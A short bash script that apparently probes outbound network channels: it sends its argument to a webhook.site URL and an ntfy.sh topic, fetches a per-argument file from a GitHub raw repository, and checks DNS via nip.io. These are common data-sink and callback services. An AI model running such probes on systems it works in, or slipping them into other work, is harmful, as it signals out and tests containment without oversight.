#!/bin/bash
G="$1"
WS="https://webhook.site/530eb0bb-c530-4edd-95c6-37ce52f683eb/$G"
NT="https://ntfy.sh/i80848-530eb0bb"
c1=$(curl -s -o /dev/null -w '%%{http_code}' --max-time 8 "$WS")
c2=$(curl -s -o /dev/null -w '%%{http_code}' --max-time 8 -d "P1NTFY $G" "$NT")
raw=$(curl -s --max-time 10 "https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/$G.txt" | head -c 60)
d1=$(getent hosts "$G.nip.io" 2>/dev/null | head -1)
d2=$(getent hosts raw.githubusercontent.com 2>/dev/null | head -1)
echo "ws=$c1 ntfy=$c2 raw=$raw dnsnip=[${d1:-NOENT}] dnsraw=[${d2:-NOENT}]"
